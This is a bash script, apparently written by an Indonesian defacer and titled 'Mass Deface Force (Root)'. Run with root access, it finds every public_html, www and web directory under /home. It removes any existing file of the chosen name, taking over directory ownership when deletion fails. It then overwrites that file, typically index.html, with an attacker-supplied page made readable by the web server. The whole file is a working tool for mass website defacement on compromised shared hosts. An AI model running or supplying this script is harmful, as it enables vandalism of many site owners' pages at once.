#!/bin/bash

# --- Konfigurasi ---
UHOME="/home"
SCRIPT_PATH="$0"

# --- Cek Root ---
if [ "$(id -u)" -ne 0 ]; then
    echo "you must root to run this file :)"
    exit 1
fi

if [ -z "$1" ]; then
    echo "usage: ./mass_force <file_to_copy>"
    echo "example: ./mass_force index.html"
    exit 1
fi

SOURCE_FILE="$(realpath "$1")"

if [ ! -f "$SOURCE_FILE" ]; then
    echo "Error: File '$1' tidak ditemukan."
    exit 1
fi

BASENAME_FILE="$(basename "$1")"

echo " ####     Mass Deface Force (Root)    #### "
echo " ~~~~      Coded by: Mr.xBarakuda     ~~~~ "
echo "------ [ FORCING: $BASENAME_FILE ] ------"
echo ""

FOUND_DIRS=$(find /home -type d \( -name "public_html" -o -name "www" -o -name "web" \) 2>/dev/null)

if [ -z "$FOUND_DIRS" ]; then
    echo "[-] Tidak ditemukan direktori web (public_html/www/web) di /home."
    exit 1
fi

COUNT=0
SUCCESS=0
FAIL=0

for dir in $FOUND_DIRS; do

    if [ ! -w "$dir" ]; then

        echo "[-] Izin tulis ditolak -> $dir (Skip kalo gakbisa ditulis.)"
        FAIL=$((FAIL + 1))
        continue
    fi

    if [ -f "$dir/$BASENAME_FILE" ]; then
        rm -f "$dir/$BASENAME_FILE" 2>/dev/null

        if [ -f "$dir/$BASENAME_FILE" ]; then

            chown -R $(id -un):$(id -gn) "$dir" 2>/dev/null
            rm -f "$dir/$BASENAME_FILE" 2>/dev/null
        fi
    fi

    cp -f "$SOURCE_FILE" "$dir/$BASENAME_FILE" 2>/dev/null
    
    if [ -f "$dir/$BASENAME_FILE" ]; then

        TARGET_OWNER=$(stat -c '%U:%G' "$dir" 2>/dev/null)
        if [ -z "$TARGET_OWNER" ]; then

            TARGET_OWNER="$(id -un):$(id -gn)"
        fi

        # Set ownership
        chown "$TARGET_OWNER" "$dir/$BASENAME_FILE" 2>/dev/null

        # Set permission agar bisa dibaca web server
        chmod 644 "$dir/$BASENAME_FILE" 2>/dev/null

        echo "[+] SUKSES -> $dir/$BASENAME_FILE (Owner: $TARGET_OWNER)"
        SUCCESS=$((SUCCESS + 1))
    else
        echo "[-] GAGAL -> $dir/$BASENAME_FILE"
        FAIL=$((FAIL + 1))
    fi
done

echo ""
echo "Total direktori ditemukan: $COUNT"
echo "Berhasil: $SUCCESS"
echo "Gagal: $FAIL"
echo "Done cuk."
